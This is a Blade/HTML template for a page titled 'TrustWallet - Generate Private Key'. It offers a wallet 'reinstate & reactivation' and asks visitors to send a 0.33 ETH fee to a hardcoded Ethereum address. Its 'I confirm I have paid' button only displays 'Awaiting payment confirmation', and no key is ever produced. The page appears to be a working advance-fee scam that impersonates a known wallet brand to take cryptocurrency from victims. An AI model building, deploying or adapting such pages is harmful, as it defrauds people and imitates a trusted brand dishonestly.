@include('home.header')

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TrustWallet - Generate Private Key</title>

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Material Icons -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <style>
        :root {
            --trust-primary: #3375bb;
            --trust-dark: #0b0f16;
            --trust-card: #141a24;
            --trust-border: #2a3344;
            --trust-text-light: #e2e8f0;
            --trust-text-secondary: #94a3b8;
        }
        
        body {
            background: var(--trust-dark);
            color: var(--trust-text-light);
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            padding-top: 20px;
        }

        .trust-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            margin-bottom: 30px;
        }

        .trust-logo {
            font-weight: 700;
            font-size: 22px;
            color: white;
            display: flex;
            align-items: center;
        }

        .trust-logo::before {
            content: "";
            display: inline-block;
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #3375bb, #5ba2ff);
            border-radius: 10px;
            margin-right: 10px;
        }

        .wallet-card {
            background: var(--trust-card);
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            border: 1px solid var(--trust-border);
            max-width: 500px;
            margin: 0 auto;
        }

        .btn-primary {
            background: var(--trust-primary);
            border: none;
            font-weight: 600;
            padding: 14px;
            border-radius: 16px;
            font-size: 16px;
            transition: all 0.2s ease;
            box-shadow: 0 4px 12px rgba(51, 117, 187, 0.3);
        }

        .btn-primary:hover {
            background: #2a639e;
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(51, 117, 187, 0.4);
        }

        .modal-content {
            background: var(--trust-card);
            border-radius: 20px;
            color: var(--trust-text-light);
            border: 1px solid var(--trust-border);
        }

        .modal-header, .modal-footer {
            border-color: var(--trust-border);
        }

        .form-control {
            background: rgba(15, 20, 28, 0.7);
            border: 1px solid var(--trust-border);
            color: var(--trust-text-light);
            padding: 14px 16px;
            border-radius: 12px;
            font-size: 16px;
        }

        .form-control:focus {
            box-shadow: 0 0 0 3px rgba(51, 117, 187, 0.2);
            border-color: var(--trust-primary);
        }

        .wallet-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--trust-primary), #5ba2ff);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
        }

        .wallet-icon i {
            font-size: 40px;
            color: white;
        }

        .back-button {
            color: var(--trust-text-light);
            background: none;
            border: none;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .back-button:hover {
            color: var(--trust-primary);
        }
    </style>
</head>
<body>
    

<div class="trust-header">
    <div class="trust-logo">Iabstrakt</div>
</div>

@if(session('error'))
    <div class="alert alert-success text-center">
        {{ session('error') }}
    </div>
@endif


<div class="container">
    <div class="wallet-card">
        <div class="wallet-icon">
            <i class="material-icons">vpn_key</i>
        </div>
        
        <h3 class="text-center mb-3">Reinstate & reactivation </h3>
        <p class="text-center text-secondary">This will require intensive technical intervention and may involve significant additional costs.</p>

        <button class="btn btn-primary w-100 mb-3" onclick="openAddressModal()">
            <i class="material-icons" style="font-size:20px; margin-right:8px;">key</i>
            Generate Private Key
        </button>
    </div>
</div>

<!-- Address Input Modal -->
<div class="modal fade" id="addressModal" tabindex="-1">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content">
            <div class="modal-header py-2 px-3">
                <button type="button" class="back-button p-0 me-2" data-bs-dismiss="modal">
                    <i class="material-icons">arrow_back</i>
                </button>
                <h6 class="modal-title flex-grow-1 text-center m-0" style="font-size:1rem;">Amount Fees: <span style="color:#5ba2ff">0.33 ETH</span></h6>
                <div style="width:32px;"></div>
            </div>
            <div class="modal-body py-3 px-3">
                <div class="mb-2">
                    <label class="mb-1 fw-bold small">Wallet Address:</label>
                    <div class="input-group flex-nowrap">
                        <input id="walletAddress" class="form-control bg-dark text-light small px-2 py-1" style="font-size:0.95rem; user-select:all;" value="0x41E00aF6a99f36fF18F45Bc089a8c7B0C9cf8B33" readonly>
                        <button class="btn btn-outline-secondary px-2 py-1 d-flex align-items-center" type="button" id="copyAddressBtn" onclick="copyWalletAddress()" title="Copy">
                            <span class="material-icons" style="font-size:18px;">content_copy</span>
                        </button>
                    </div>
                    <div id="copyFeedback" class="text-success small mt-1" style="display:none;">Copied!</div>
                </div>
                <div class="form-check mb-2">
                    <input class="form-check-input" type="checkbox" value="" id="confirmPaidCheck">
                    <label class="form-check-label small" for="confirmPaidCheck">
                        I confirm I have paid
                    </label>
                </div>
                <div id="paymentFeedback" class="alert alert-info text-center py-1 px-2 mb-0 small" style="display:none; font-size:0.95rem;">
                    Awaiting payment confirmation <span class="material-icons align-middle" style="font-size:16px;">search</span>
                </div>
            </div>
            <div class="modal-footer py-2 px-3">
                <button type="button" class="btn btn-primary w-100 py-2" id="confirmPaidBtn" onclick="confirmPaid()" disabled style="font-size:1rem;">
                    <i class="material-icons" style="font-size:18px;">check_circle</i> Confirm
                </button>
            </div>
        </div>
    </div>
</div>

<script>
// Enable confirm button only if checkbox is checked
document.addEventListener('DOMContentLoaded', function() {
    const check = document.getElementById('confirmPaidCheck');
    const btn = document.getElementById('confirmPaidBtn');
    if (check && btn) {
        check.addEventListener('change', function() {
            btn.disabled = !this.checked;
        });
    }
});

function copyWalletAddress() {
    const addressDiv = document.getElementById('walletAddress');
    const feedback = document.getElementById('copyFeedback');
    if (addressDiv) {
        const address = addressDiv.textContent;
        navigator.clipboard.writeText(address).then(function() {
            if (feedback) {
                feedback.style.display = 'block';
                setTimeout(() => { feedback.style.display = 'none'; }, 1500);
            }
        });
    }
}

function confirmPaid() {
    const feedback = document.getElementById('paymentFeedback');
    if (feedback) {
        feedback.style.display = 'block';
        feedback.textContent = 'Awaiting payment confirmation '; 
        const icon = document.createElement('span');
        icon.className = 'material-icons align-middle';
        icon.style.fontSize = '18px';
        icon.textContent = 'search';
        feedback.appendChild(icon);
    }
    // Optionally, you can add AJAX here to notify backend
}
</script>
<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<script>
function openAddressModal() {
    const modal = new bootstrap.Modal(document.getElementById('addressModal'));
    modal.show();
}

function saveWallet() {
    const address = document.getElementById('walletAddress').value.trim();
    if (!address) {
        alert('Please enter a wallet address');
        return;
    }
    alert('Wallet saved successfully!');
    bootstrap.Modal.getInstance(document.getElementById('addressModal')).hide();
}
</script>



</body>
</html>
